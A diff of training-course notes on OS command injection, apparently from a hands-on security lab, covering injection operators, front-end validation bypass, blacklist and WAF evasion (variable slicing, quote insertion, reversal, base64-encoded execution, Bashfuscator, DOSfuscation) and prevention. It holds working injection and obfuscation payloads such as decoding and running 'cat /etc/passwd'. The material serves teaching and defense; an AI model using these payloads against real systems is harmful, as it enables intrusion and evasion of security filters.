@@ -1,20 +1,10 @@
-## Intro to Command Injections
+# Command Injections
 
-Command injection executes OS commands on the back-end server through unsanitized user input. Full network compromise can follow.
+Command injection = user input lands (directly or indirectly) in a function executing OS commands without sanitization → arbitrary command execution on the back-end server, potentially the whole network. Injection as a class is OWASP Top 10 #3: input misinterpreted as part of the query/code being executed, subverting its intended outcome. Same pattern across types — OS command injection (input in an OS command), code injection (input in an evaluating function), SQLi (input in a query), XSS/HTML injection (input displayed on a page) — plus LDAP, NoSQL, header, XPath, IMAP, ORM and more. New web technologies keep producing new injection types. Core skill: escaping the input string's boundaries into the parent query.
 
-### What are Injections
+Not web-only: any binary or thick client passing unsanitized input to a system-command function falls to the same methods.
 
-Injection is OWASP Top 10 risk #3. User input is interpreted as part of the executed query or code, changing the intended outcome.
-
-Common injection classes include OS command injection, code injection, SQL injection, and Cross-Site Scripting/HTML injection. Others include LDAP, NoSQL, HTTP header, XPath, IMAP, and ORM injection.
-
-### OS Command Injections
-
-User input must reach a function that executes system commands. The vulnerability is not limited to web apps; binaries and thick clients are vulnerable when they pass unsanitized input to command-execution functions.
-
-### PHP Example
-
-PHP command-execution functions include `exec`, `system`, `shell_exec`, `passthru`, and `popen`.
+Vulnerable code shapes:
 
 ```php
 <?php
@@ -24,125 +14,61 @@ if (isset($_GET['filename'])) {
 ?>
 ```
 
-`filename` goes directly into `system()`.
-
-### NodeJS Example
-
-NodeJS may use `child_process.exec` or `child_process.spawn`.
-
 ```javascript
 app.get("/createfile", function(req, res){
     child_process.exec(`touch /tmp/${req.query.filename}.txt`);
 })
 ```
 
-`req.query.filename` goes directly into the executed command.
+PHP execution functions: `exec`, `system`, `shell_exec`, `passthru`, `popen`. NodeJS: `child_process.exec`, `child_process.spawn`. Every language has equivalents, all exploited identically.
 
 ## Detection
 
-Basic detection and exploitation are the same: append a command and watch for changed output. Advanced cases may require fuzzing or code review.
+For basic command injection, detection = exploitation: append a command through an injection operator and see if the output deviates from the normal result. (Advanced/indirect/blind cases need fuzzing or code review and gradual payload building.)
 
-### Command Injection Detection
+Recon the function first. Example: a Host Checker taking an IP returns ping output with a single packet transmitted → the command is almost certainly `ping -c 1 OUR_INPUT`. Guess the wrapper command from the output, then test injection into it.
 
-A Host Checker utility likely runs:
+**Injection operators** — expected input, operator, then the command. All work cross-platform (PHP/Linux, .NET/Windows, NodeJS/macOS alike), with noted exceptions:
 
-```bash
-ping -c 1 OUR_INPUT
-```
+- `;` (`%3b`) — both commands execute. Fails on Windows CMD (fine in PowerShell)
+- New line `\n` (`%0a`) — both execute
+- `&` (`%26`) — both execute, second output generally shown first
+- `|` (`%7c`) — both execute, only second output shown
+- `&&` (`%26%26`) — second runs only if first succeeds
+- `||` (`%7c%7c`) — second runs only if first fails
+- Backticks `` `` `` (`%60%60`) and `$()` (`%24%28%29`) — sub-shell, Linux only
 
-If input is not sanitized or escaped, additional commands can be appended.
-
-### Command Injection Methods
-
-Semicolon `;` URL-encodes to `%3b` and executes both commands. New line `\n` encodes to `%0a` and executes both commands. Background `&` encodes to `%26`, executes both, and usually shows the second output first. Pipe `|` encodes to `%7c`, executes both, but only shows the second output. AND `&&` encodes to `%26%26` and executes both only if the first command succeeds. OR `||` encodes to `%7c%7c` and executes the second only if the first fails. Sub-shell backticks `` `` `` encode to `%60%60`, and sub-shell `$()` encodes to `%24%28%29`; both are Linux-only and execute both commands.
-
-These operators generally work across languages, frameworks, and back-end operating systems. Semicolon does not work in Windows CMD, but works in PowerShell.
-
-SQL injection operators include `'`, `,`, `;`, `--`, `/*`, `*/`. Command injection operators include `;` and `&&`. LDAP injection operators include `*`, `(`, `)`, `&`, and `|`. XPath injection operators include `'`, `or`, `and`, `not`, `substring`, `concat`, and `count`. OS command injection operators include `;`, `&`, and `|`. Code injection operators include `'`, `;`, `--`, `/*`, `*/`, `$()`, `${}`, `#{}`, `%{}`, and `^`. Directory traversal operators include `../`, `..\`, and `%00`. Object injection operators include `;`, `&`, and `|`. XQuery injection operators include `'`, `;`, `--`, `/*`, `*/`. Shellcode injection operators include `\x`, `\u`, `%u`, and `%n`. Header injection operators include `\n`, `\r\n`, `\t`, `%0d`, `%0a`, and `%09`. The set is incomplete and environment-dependent.
+Operators generalize across injection classes — SQLi (`' ; -- /* */`), LDAP (`* ( ) & |`), XPath (`' or and not substring concat count`), code injection (`' ; -- /* */ $() ${} #{} %{} ^`), path traversal (`../ ..\\ %00`), object injection (`; & |`), XQuery (`' ; -- /* */`), shellcode (`\x \u %u %n`), header injection (`\n \r\n \t %0d %0a %09`). Incomplete list; environment-dependent.
 
 ## Injecting Commands
 
-### Injecting Our Command
+Start with `;` — payload `127.0.0.1; whoami` making the back-end run `ping -c 1 127.0.0.1; whoami`. Always test the final command locally first to validate it before sending.
 
-Semicolon payload:
+The app may refuse the payload with a "match the requested format" style error. Check where that validation lives: Firefox dev tools → Network tab (CTRL+SHIFT+E) → click Check → if no request fires but the error appears, validation is front-end only. Extremely common — front-end and back-end built by different teams, or devs trusting front-end checks.
 
-```bash
-ping -c 1 127.0.0.1; whoami
-```
+**Bypass**: proxy through Burp/ZAP, intercept a normal request, send to Repeater (CTRL+R), paste the payload, URL-encode it (select → CTRL+U), send. Response shows ping output *plus* whoami output → injected.
 
-If the front-end rejects non-IP input and Firefox Developer Tools shows no request, validation is client-side. Open the Network tab with `CTRL + SHIFT + E`.
+## Other Injection Operators
 
-### Bypassing Front-End Validation
+`&&` behaves like `;` when the first command succeeds — `127.0.0.1 && whoami` returns both outputs. Difference shows when the first command fails: `&&` then skips the second entirely.
 
-Proxy the request through Burp Suite or ZAP. Send a normal request, intercept it, send it to Repeater with `CTRL + R`, modify the payload, URL-encode the payload with `CTRL + U`, then send.
-
-Payload:
-
-```text
-127.0.0.1; whoami
-```
-
-URL-encoded form:
-
-```text
-127.0.0.1%3b%20whoami
-```
-
-### Other Injection Operators
-
-### AND Operator
-
-```bash
-ping -c 1 127.0.0.1 && whoami
-```
-
-URL-encoded payload:
-
-```text
-127.0.0.1+%26%26+whoami
-```
-
-The second command runs only if the first succeeds.
-
-### OR Operator
-
-```bash
-ping -c 1 127.0.0.1 || whoami
-```
-
-The first command succeeds, so `whoami` does not run.
-
-Break the first command:
+`||` inverts that: second command runs only when the first *fails* (bash stops after exit code 0). Useless with a working IP — but deliberately break the first command and it shines. Drop the IP entirely:
 
 ```bash
 ping -c 1 || whoami
+# ping: usage error: Destination address required
+# 21y4d
 ```
 
-`ping` fails, so `whoami` runs.
-
-URL-encoded minimal payload:
-
-```text
-|| whoami
-```
+Payload `|| whoami` — simpler input, cleaner output (only the second command's output comes back). The pattern: when your injection breaks the original command with no way to make both run, switch to `||`.
 
 ## Identifying Filters
 
-### Filter/WAF Detection
+Back-end mitigations: blacklisted characters/words in the app code, and WAFs with broader detection (SQLi, XSS, etc.).
 
-`Invalid input` rendered inside the application output usually indicates an application-level filter. A separate error page containing request metadata or client IP may indicate a WAF.
+Fingerprint the blocker: `invalid input` shown inline in the output field = the PHP app itself detected it. A different page displaying your IP and request = WAF denial.
 
-Test payload:
-
-```bash
-127.0.0.1; whoami
-```
-
-Possible triggers: `;`, space, or `whoami`.
-
-### Blacklisted Characters
-
-Example PHP character blacklist:
+Work out *what* triggered it. Payload `127.0.0.1; whoami` carries three suspects: the `;`, the space, and the word `whoami`. Blacklist filter shape:
 
 ```php
 $blacklist = ['&', '|', ';', ...SNIP...];
@@ -153,174 +79,63 @@ foreach ($blacklist as $character) {
 }
 ```
 
-### Identifying Blacklisted Character
-
-Reduce the payload one character at a time. If `127.0.0.1` works but `127.0.0.1;` fails, semicolon is blacklisted.
+**Identify the blacklisted character** by reducing to one addition at a time. `127.0.0.1` works; `127.0.0.1;` gets denied → `;` is blacklisted. Repeat across the operators to map the whole blacklist.
 
 ## Bypassing Space Filters
 
-### Bypass Blacklisted Operators
+Most operators turn out blacklisted — except new line `%0a`, usually left alone since payloads may need it. It works on both Linux and Windows, so it becomes the injection operator: `127.0.0.1%0a`.
 
-New line is often not blacklisted. URL-encoded newline:
+The space after it gets blocked next (very common blacklist entry for inputs like IPs that should never contain spaces). Several workarounds:
 
-```text
-127.0.0.1%0a
-```
-
-### Bypass Blacklisted Spaces
-
-If this fails:
-
-```text
-127.0.0.1%0a whoami
-```
-
-Test the space alone:
-
-```text
-127.0.0.1%0a 
-```
-
-If it fails, space is blacklisted.
-
-### Using Tabs
-
-Tab replaces space:
-
-```text
-127.0.0.1%0a%09whoami
-```
-
-### Using $IFS
-
-`${IFS}` defaults to space/tab and works between arguments:
-
-```text
-127.0.0.1%0a${IFS}whoami
-```
-
-### Using Brace Expansion
-
-Bash brace expansion inserts spaces between brace-wrapped arguments:
+- **Tabs** — `%09` works as a separator on both Linux and Windows: `127.0.0.1%0a%09`
+- **$IFS** — Linux environment variable whose default value is space+tab; `${IFS}` expands where the space should be: `127.0.0.1%0a${IFS}`
+- **Brace expansion** — bash inserts the spaces itself for brace-wrapped arguments:
 
 ```bash
 {ls,-la}
 ```
 
-Injection form:
-
-```text
-127.0.0.1%0a{ls,-la}
-```
-
-PayloadsAllTheThings documents additional no-space command techniques.
+Same trick in payloads: `127.0.0.1%0a{ls,-la}`. PayloadsAllTheThings' "commands without spaces" page has more.
 
 ## Bypassing Other Blacklisted Characters
 
-### Linux
+`/` (Linux) and `\` (Windows) are heavily blacklisted since paths need them. Goal: manufacture any character from pieces that aren't filtered.
 
-Environment variables can produce filtered characters by substring.
-
-```bash
-echo ${PATH}
-```
-
-Example output:
-
-```text
-/usr/local/bin:/usr/bin:/bin:/usr/games
-```
-
-Extract slash:
+**Linux — environment variable slicing**. `${IFS}` substitutes directly, but no variable holds `/` or `;` by itself — slice one out of a longer value instead:
 
 ```bash
-echo ${PATH:0:1}
+echo ${PATH}           # /usr/local/bin:/usr/bin:/bin:/usr/games
+echo ${PATH:0:1}       # /
+echo ${LS_COLORS:10:1} # ;
 ```
 
-Output:
+`start:length` syntax; `$HOME` and `$PWD` work for `/` too. Find candidates with `printenv`. In payloads drop the `echo` — the sliced variable sits inline: `127.0.0.1${LS_COLORS:10:1}${IFS}` rebuilds `; ` without a single filtered character.
 
-```text
-/
-```
-
-`$HOME` or `$PWD` can also work.
-
-Extract semicolon:
-
-```bash
-echo ${LS_COLORS:10:1}
-```
-
-Output:
-
-```text
-;
-```
-
-In payloads, omit `echo`; use the expansion directly. `printenv` lists variables that may contain useful characters.
-
-Payload using extracted semicolon and `${IFS}`:
-
-```text
-127.0.0.1${LS_COLORS:10:1}${IFS}whoami
-```
-
-### Windows
-
-CMD substring extraction:
+**Windows** — same idea, different syntax. CMD substring on a variable (`%HOMEPATH%` → `\Users\htb-student`), start position then a negative end offset:
 
 ```cmd
 echo %HOMEPATH:~6,-11%
 ```
 
-Output:
-
-```text
-\
-```
-
-PowerShell character indexing:
+PowerShell treats the variable as an array — index the character directly:
 
 ```powershell
 $env:HOMEPATH[0]
 ```
 
-Output:
+Enumerate candidates with `Get-ChildItem Env:`.
 
-```text
-\
-```
-
-Another example:
-
-```powershell
-$env:PROGRAMFILES[10]
-```
-
-`Get-ChildItem Env:` lists PowerShell environment variables.
-
-### Character Shifting
-
-`man ascii` can identify adjacent characters. Backslash is ASCII 92; `[` is 91.
+**Character shifting** — shift any character by one position in the ASCII table. Look up the character before the one you need (`man ascii` — `\` is 92, so `[` on 91), feed it to:
 
 ```bash
-man ascii
 echo $(tr '!-}' '"-~'<<<[)
 ```
 
-Output:
-
-```text
-\
-```
-
-The same idea works in PowerShell, though commands are longer. To produce `;`, shift the character immediately before it in ASCII.
+PowerShell can do the same, just more verbose.
 
 ## Bypassing Blacklisted Commands
 
-### Commands Blacklist
-
-Example PHP command blacklist:
+Characters solved, adding `whoami` back gets blocked again → word blacklist:
 
 ```php
 $blacklist = ['whoami', 'cat', ...SNIP...];
@@ -331,45 +146,25 @@ foreach ($blacklist as $word) {
 }
 ```
 
-Exact-match blacklists can be bypassed by obfuscating command strings.
+Exact string match — obfuscate the word so it runs but doesn't read.
 
-### Linux & Windows
-
-Quotes are ignored by shells when inserted inside commands.
+**Linux & Windows — quote insertion.** Shells ignore quotes inside command words:
 
 ```bash
 w'h'o'am'i
-```
-
-```bash
 w"h"o"am"i
 ```
 
-Do not mix quote types. Quote count must be even.
+Rules: never mix quote types, count must be even. Payload: `127.0.0.1%0aw'h'o'am'i`.
 
-Injection payload:
-
-```text
-127.0.0.1%0aw'h'o'am'i
-```
-
-### Linux Only
-
-Backslash and `$@` can also be inserted:
+**Linux only** — backslash and `$@` also vanish, and unlike quotes need no even count:
 
 ```bash
 who$@ami
-```
-
-```bash
 w\ho\am\i
 ```
 
-Count does not need to be even.
-
-### Windows Only
-
-Caret can be inserted in CMD commands:
+**Windows only** — caret:
 
 ```cmd
 who^ami
@@ -377,165 +172,75 @@ who^ami
 
 ## Advanced Command Obfuscation
 
-### Case Manipulation
+For WAFs and advanced filters, basic tricks stop working.
 
-Windows CMD and PowerShell are case-insensitive:
-
-```powershell
-WhOaMi
-```
-
-Linux bash is case-sensitive. Convert mixed case to lowercase before execution:
+**Case manipulation** — blacklists rarely enumerate case variants. Windows CMD/PowerShell are case-insensitive, so `WhOaMi` runs as-is. Linux is case-sensitive — lowercase it at runtime in a sub-shell:
 
 ```bash
 $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
 ```
 
-If spaces are filtered, replace them with tabs:
-
-```text
-$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
-```
-
-Alternative:
+Gotcha: this command contains spaces. A filtered character anywhere in the obfuscated payload still kills the request — swap in `%09` and it works. Alternative lowercase builder:
 
 ```bash
 $(a="WhOaMi";printf %s "${a,,}")
 ```
 
-### Reversed Commands
-
-Reverse the command first:
+**Reversed commands** — write `imaohw`, reverse it back at execution time. Generate the reversed form first:
 
 ```bash
 echo 'whoami' | rev
 ```
 
-Output:
-
-```text
-imaohw
-```
-
-Execute through reversal:
+Then:
 
 ```bash
 $(rev<<<'imaohw')
 ```
 
-If character filters apply, reverse filtered characters too or include them before reversing.
-
-PowerShell reverse:
+The payload never contains the literal command word. Filtering a *character* too? Reverse it along with the command or include it in the reversed string. Windows version:
 
 ```powershell
 "whoami"[-1..-20] -join ''
-```
-
-Output:
-
-```text
-imaohw
-```
-
-Execute:
-
-```powershell
 iex "$('imaohw'[-1..-20] -join '')"
 ```
 
-### Encoded Commands
-
-Base64-encode the payload:
+**Encoded commands** — for payloads full of filtered characters, or characters the server will URL-decode and mangle before the shell sees them. Encode the whole payload, decode + execute at runtime — and build the wrapper yourself so it's unique and not signature-matched. base64 (`xxd` for hex as an alternative):
 
 ```bash
 echo -n 'cat /etc/passwd | grep 33' | base64
-```
-
-Output:
-
-```text
-Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
-```
-
-Decode and execute. `<<<` avoids using a filtered pipe:
-
-```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
 
-If `bash` or `base64` is filtered, use `sh`, `openssl`, or `xxd` alternatives.
-
-Windows PowerShell base64 encoding:
+`<<<` here replaces the pipe `|` — itself a filtered character. If `bash` or `base64` are blacklisted words, chain the character-insertion tricks, or swap in `sh` / `openssl` (b64) / `xxd` (hex). Windows equivalent — encode as UTF-16LE base64:
 
 ```powershell
 [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
-```
-
-Output:
-
-```text
-dwBoAG8AYQBtAGkA
-```
-
-Linux can produce the same UTF-16LE base64:
-
-```bash
-echo -n whoami | iconv -f utf-8 -t utf-16le | base64
-```
-
-PowerShell decode and execute:
-
-```powershell
 iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
 ```
 
-Wildcards, regex, output redirection, and integer expansion are additional obfuscation options.
+Same output producible from Linux: `echo -n whoami | iconv -f utf-8 -t utf-16le | base64`. Further techniques (wildcards, regex, output redirection, integer expansion) on PayloadsAllTheThings.
 
 ## Evasion Tools
 
-### Linux (Bashfuscator)
-
-Bashfuscator (https://github.com/Bashfuscator/Bashfuscator) automates bash obfuscation.
+**Bashfuscator (Linux)**:
 
 ```bash
 git clone https://github.com/Bashfuscator/Bashfuscator
 cd Bashfuscator
-cd ./bashfuscator/bin/
+pip3 install setuptools==65
+python3 setup.py install --user
 ```
 
-Help:
-
-```bash
-./bashfuscator -h
-```
-
-Basic obfuscation:
-
-```bash
-./bashfuscator -c 'cat /etc/passwd'
-```
-
-Shorter, simpler output:
+Basic run picks a random technique — output can balloon to over a million characters. Constrain it:
 
 ```bash
 ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
 ```
 
-Example generated payload:
+(`-s` payload size, `-t` execution time.) Verify locally with `bash -c '<payload>'` before sending — the result should execute the original command while bearing no resemblance to it.
 
-```bash
-eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
-```
-
-Test:
-
-```bash
-bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
-```
-
-### Windows (DOSfuscation)
-
-DOSfuscation (https://github.com/danielbohannon/Invoke-DOSfuscation.git) is an interactive PowerShell obfuscation tool.
+**Invoke-DOSfuscation (Windows)** — interactive:
 
 ```powershell
 git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
@@ -544,42 +249,21 @@ Import-Module .\Invoke-DOSfuscation.psd1
 Invoke-DOSfuscation
 ```
 
-Interactive usage:
+Menu: `TUTORIAL`, `BINARY` (obfuscated binary syntax), `ENCODING` (environment variable encoding), `PAYLOAD`. Usage:
 
-```powershell
-help
+```text
 SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
 encoding
 1
 ```
 
-Example generated payload:
-
-```cmd
-typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
-```
-
-Run in CMD:
-
-```cmd
-typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
-```
-
-DOSfuscation can also run through `pwsh` on Linux.
+Output like `typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:...` runs fine on CMD. No Windows VM? Run it through `pwsh` on Linux — preinstalled on Pwnbox.
 
 ## Command Injection Prevention
 
-### System Commands
+**System commands** — avoid command-executing functions entirely where possible, especially with user input; even indirect influence counts. Prefer the language's built-in equivalent (PHP `fsockopen` for host-alive checks instead of shelling out to ping). If a system command is unavoidable, validate + sanitize input on the back-end and minimize these call sites to cases with no built-in alternative.
 
-Avoid command-execution functions when possible. Use language-native functions instead. For host liveness checks in PHP, use `fsockopen` rather than `ping` through `system()`.
-
-If system commands are unavoidable, never pass raw user input to them. Validate and sanitize on the back-end, and restrict usage to necessary cases.
-
-### Input Validation
-
-Validate on both front-end and back-end. Input must match the expected format.
-
-PHP IP validation:
+**Input validation** — front-end *and* back-end. Standard formats via built-in filters:
 
 ```php
 if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
@@ -589,9 +273,7 @@ if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
 }
 ```
 
-Regex validation with `preg_match` works for non-standard formats.
-
-JavaScript IP validation:
+Non-standard formats via regex (`preg_match`), or JS/NodeJS both sides:
 
 ```javascript
 if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
@@ -602,33 +284,27 @@ else{
 }
 ```
 
-NodeJS can use libraries such as `is-ip`, installed through npm, then call `isIp(ip)`.
+NodeJS also has format libraries (npm `is-ip` → `isIp(ip)`).
 
-### Input Sanitization
-
-Sanitize after validation. Remove unnecessary special characters. Blacklisting words is weak.
-
-PHP:
+**Input sanitization** — the critical layer, always *after* validation (validation can fail on a bad regex). Strip everything the format doesn't need rather than blacklisting words:
 
 ```php
 $ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
 ```
 
-JavaScript:
-
 ```javascript
 var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
 ```
 
-NodeJS DOMPurify:
+NodeJS alternative: DOMPurify (`DOMPurify.sanitize(ip)`). When all special characters must survive (user comments), escape instead — PHP `escapeshellcmd`, NodeJS `escape(ip)` — but escaping is weak and routinely bypassed, as this module demonstrated.
 
-```javascript
-import DOMPurify from 'dompurify';
-var ip = DOMPurify.sanitize(ip);
-```
+**Server configuration** — reduce blast radius for when prevention fails:
 
-When special characters must be allowed, escape them. PHP can use `escapeshellcmd`; NodeJS can use `escape(ip)`. Escaping is often bypassable and should not be the only control.
+- Web server WAF (Apache `mod_security`) plus an external WAF (Cloudflare, Fortinet, Imperva)
+- Least privilege: run the web server as a low-priv user (www-data)
+- `disable_functions=system,...` in PHP
+- `open_basedir = '/var/www/html'` to scope file access
+- Reject double-encoded requests and non-ASCII URL characters
+- Drop sensitive/outdated libraries and modules (PHP CGI)
 
-### Server Configuration
-
-Use the web server's built-in WAF, such as Apache `mod_security`, plus an external WAF such as Cloudflare, Fortinet, or Imperva. Run the web server as a low-privileged user such as `www-data`. Disable dangerous PHP functions with `disable_functions=system,...`. Restrict PHP filesystem scope with `open_basedir = '/var/www/html'`. Reject double-encoded requests and non-ASCII characters in URLs. Avoid sensitive or outdated libraries and modules, such as PHP CGI. Penetration test after hardening, because a single unsafe line can still introduce command injection.
+Mitigations stack, none are absolute — millions of lines of code means one mistake anywhere reintroduces the vuln. Secure coding + continued pentesting together.
